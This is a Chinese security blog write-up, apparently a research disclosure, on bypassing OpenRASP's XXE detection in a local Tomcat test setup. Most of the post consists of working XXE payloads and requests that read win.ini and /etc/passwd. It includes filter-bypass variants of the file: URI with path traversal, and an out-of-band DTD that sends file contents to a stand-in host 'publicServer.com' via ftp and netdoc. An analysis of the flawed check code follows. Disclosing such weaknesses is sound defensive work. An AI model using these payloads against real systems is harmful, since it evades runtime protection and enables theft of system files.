> 原文链接: https://www.anquanke.com//post/id/241107 


# OpenRasp xxe算法的几种绕过方式


                                阅读量   
                                **130449**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t012b1bfb13be0028d0.png)](https://p3.ssl.qhimg.com/t012b1bfb13be0028d0.png)



openrasp检测xxe漏洞有3种算法。本文主要是讲对“算法2 – 使用 ftp:// 等异常协议加载外部实体”与”算法3 – 使用 file:// 协议读取文件”的绕过。

## 测试环境

windows / tomcat<br>
目前openrasp最新版本是1.3.7-beta。

[![](https://p5.ssl.qhimg.com/t016f566beb0a8bc696.png)](https://p5.ssl.qhimg.com/t016f566beb0a8bc696.png)

官网安装说明，[https://rasp.baidu.com/doc/install/software.html。](https://rasp.baidu.com/doc/install/software.html%E3%80%82)<br>
按照官网说明安装完后，把官方提供的测试案例vulns.war放入tomcat下webapp目录即可。<br>
此处装的是单机模式，没有管理后台，还需要修改tomcat根目录下rasp/plugins/official.js中如下配置，以开启拦截。

[![](https://p4.ssl.qhimg.com/t01eba1edf0656fc19e.png)](https://p4.ssl.qhimg.com/t01eba1edf0656fc19e.png)

环境部署完后，访问vulns测试案例。响应头里面如果有openrasp字样，说明openrasp部署成功。

[![](https://p3.ssl.qhimg.com/t01306f81dc7b8ae10c.png)](https://p3.ssl.qhimg.com/t01306f81dc7b8ae10c.png)



## openrasp xxe算法

openrasp对xxe漏洞有3种检测算法。

[![](https://p4.ssl.qhimg.com/t0174703aabf6cb26b8.png)](https://p4.ssl.qhimg.com/t0174703aabf6cb26b8.png)

**算法1**<br>
开启算法1后，openrasp会在解析器解析xml之前，通过反射调用解析器对象的setFeature()方法，让解析器不解析xml的外部实体，相当于openrasp会自动修复xxe漏洞。<br>
以java dom方式解析xml为例

```
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
// 从效果上讲，算法1相当于openrasp会自动添加并运行下面这一行代码
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);  // 禁用DTDs (doctypes),几乎可以防御所有xml实体攻击。
DocumentBuilder builder = factory.newDocumentBuilder();
Document d = builder.parse("src/main/resources/demo.xml");    // 解析XML
```

考虑到正常业务可能也会使用到外部实体，该算法默认配置是ignore，相当于关闭。

**算法2**<br>
根据注释可以看出，算法2会通过黑名单机制检查是否使用异常协议加载外部实体。目前黑名单会检查ftp、dict、gopher、jar、netdoc这几种协议。算法2默认开启拦截。

**算法3**<br>
从注释可以看出，算法3会检查file协议的使用情况，默认不拦截，读取不”正常”文件也只是记录日志。



## 算法3 – 使用file://协议读取文件绕过

### <a class="reference-link" name="windows%E7%8E%AF%E5%A2%83"></a>windows环境

默认算法3配置为log，不拦截。由于是部署在windows上，点击页面中第二个URL链接，成功读取到c:/windows/win.ini文件内容。

[![](https://p2.ssl.qhimg.com/t01d4d6075b38377118.png)](https://p2.ssl.qhimg.com/t01d4d6075b38377118.png)

给007-xxe.jsp文件发送的data参数值url解码后内容如下

```
&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;&lt;!DOCTYPE foo [   &lt;!ELEMENT foo ANY &gt;  &lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
```

修改official.js文件，配置算法3为block。

[![](https://p4.ssl.qhimg.com/t016f11655a59c0099d.png)](https://p4.ssl.qhimg.com/t016f11655a59c0099d.png)

再次触发上述请求，openrasp就会进行拦截。

[![](https://p1.ssl.qhimg.com/t01cbe57128f40230ce.png)](https://p1.ssl.qhimg.com/t01cbe57128f40230ce.png)

burpsuite中该请求和响应内容如下

[![](https://p0.ssl.qhimg.com/t015d9e96e81fcdf05f.png)](https://p0.ssl.qhimg.com/t015d9e96e81fcdf05f.png)

删除请求data参数中file协议后面2个/字符，即%2F，就能成功绕过openrasp了。

[![](https://p2.ssl.qhimg.com/t012a6cc84e8a513d3e.png)](https://p2.ssl.qhimg.com/t012a6cc84e8a513d3e.png)

删除请求data参数中file协议后面3个/字符，也能绕过。

[![](https://p4.ssl.qhimg.com/t01969939bde8d54f53.png)](https://p4.ssl.qhimg.com/t01969939bde8d54f53.png)

如之前所述，正常使用file协议读取文件，xxe算法3开启后，openrasp会拦截

```
file:///c:/windows/win.ini
file:///etc/passwd
```

但使用如下方式，就能成功绕过xxe算法3了

```
file:/c:/windows/win.ini        // 删除file协议后面2个/
file:c:/windows/win.ini            // 删除file协议后面3个/
```

算法3还有另外一种绕过方法。

```
file://localhost/c:/windows/win.ini
```

验证如下

[![](https://p0.ssl.qhimg.com/t01a9495fff149f8338.png)](https://p0.ssl.qhimg.com/t01a9495fff149f8338.png)

### <a class="reference-link" name="Linux%E7%8E%AF%E5%A2%83"></a>Linux环境

```
file:/etc/passwd    // 可以
file:etc/passwd        // 失败
file://localhost/etc/passwd     // 可以
```

`file:etc/passwd`没有被拦截，但也读取不到文件。但可以修改后使用下面这个payload，就能读取到/etc/passwd文件内容了。

```
file:../../../../../../../../etc/passwd
```

[![](https://p3.ssl.qhimg.com/t016e852bba51acf7cd.png)](https://p3.ssl.qhimg.com/t016e852bba51acf7cd.png)



## 算法2 – 使用ftp://等异常协议加载外部实体绕过

算法2默认开启拦截。为了方便，把上面的算法3拦截关闭，修改为默认值log。

先拿xxe ftp的测试payload试下。给007-xxe.jsp的data参数传递如下值

```
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE data [
&lt;!ENTITY % remote SYSTEM "http://127.0.0.1:9000/1.dtd"&gt;
%remote;
%send;
]&gt;
&lt;data&gt;4&lt;/data&gt;
```

1.dtd文件内容如下。（因为openrasp会拦截，所以就不用起一个ftp服务，所以ftp协议后的主机地址没改。）

```
&lt;!ENTITY % payload SYSTEM "file:///c:/windows/win.ini"&gt;
&lt;!ENTITY % param1 "&lt;!ENTITY % send SYSTEM 'ftp://publicServer.com/%payload;'&gt;"&gt;
%param1;
```

可以看到触发了拦截。

[![](https://p0.ssl.qhimg.com/t01d2452ee0e7047354.png)](https://p0.ssl.qhimg.com/t01d2452ee0e7047354.png)

此时只要把1.dtd文件中ftp改为netdoc，并同样删除后面2个/。修改后1.dtd的内容如下。

```
&lt;!ENTITY % payload SYSTEM "file:///c:/windows/win.ini"&gt;
&lt;!ENTITY % param1 "&lt;!ENTITY % send SYSTEM 'netdoc:publicServer.com/%payload;'&gt;"&gt;
%param1;
```

再重放上面的请求。这个时候openrasp不会拦截，但报错语句中显示了`c:/windows/win.ini`的文件内容。

[![](https://p0.ssl.qhimg.com/t017325275954fddcba.png)](https://p0.ssl.qhimg.com/t017325275954fddcba.png)

这种绕过如果java关闭了报错，应该就不行了。测试时发现即使算法3也同时开启了拦截，依然会报错显示被读取的文件内容。



## 绕过原理简单分析

算法3开启拦截后，发送如下请求

```
&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;&lt;!DOCTYPE foo [   &lt;!ELEMENT foo ANY &gt;  &lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
```

official.js接收到openrasp agent传递过来的params值，其中params.entity的值是”file:///c:/windows/win.ini”。<br>
按照”://“切割params.entity值后，生成一个数组items。items数组的第一元素保存了使用的协议，即”file”，第二元素保存了要读取的文件的位置，即”/c:/windows/win.ini”。由于items.length等于2，所以会进入下面第二个箭头处的if语句内。又由于满足下面第三个箭头处的if语句条件，所以会进入该if语句进而触发拦截。

[![](https://p5.ssl.qhimg.com/t0189b89168e01b9f84.png)](https://p5.ssl.qhimg.com/t0189b89168e01b9f84.png)

当发送如下请求时

```
&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;&lt;!DOCTYPE foo [   &lt;!ELEMENT foo ANY &gt;  &lt;!ENTITY xxe SYSTEM "file:/c:/windows/win.ini" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
```

或者

```
&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;&lt;!DOCTYPE foo [   &lt;!ELEMENT foo ANY &gt;  &lt;!ENTITY xxe SYSTEM "file:c:/windows/win.ini" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
```

params.entity的值会是”file:/c:/windows/win.ini” 或者”file:c:/windows/win.ini” ，按照”://“进行切割，生成的items数组长度永远小于2，所以会直接运行到末尾的”return clean”处，从而绕过。

[![](https://p2.ssl.qhimg.com/t01dd3ebf46f5062b69.png)](https://p2.ssl.qhimg.com/t01dd3ebf46f5062b69.png)

当发送如下请求时

```
&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;&lt;!DOCTYPE foo [   &lt;!ELEMENT foo ANY &gt;  &lt;!ENTITY xxe SYSTEM "file://localhost/c:/windows/win.ini" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
```

上面is_absolute_path()函数中path参数值会是”localhost/c:/windows/win.ini”。linux系统情况时，path的值会是类似”localhost/etc/passwd”。分析函数代码，可以看出这种情况下is_absolute_path()函数返回值永远是false。

```
function is_absolute_path(path, is_windows) `{`

    // Windows - C:\\windows
    if (is_windows) `{`

        if (path[1] == ':')
        `{`
            var drive = path[0].toLowerCase()
            if (drive &gt;= 'a' &amp;&amp; drive &lt;= 'z')
            `{`
                return true
            `}`
        `}`
    `}`

    // Unices - /root/
    return path[0] === '/'
`}`
```

[![](https://p3.ssl.qhimg.com/t01f635ca3681d40972.png)](https://p3.ssl.qhimg.com/t01f635ca3681d40972.png)



## 参考

[file URI scheme](https://en.wikipedia.org/wiki/File_URI_scheme)<br>[XXE修复方案参考](https://blog.csdn.net/oscarli/article/details/94735001)
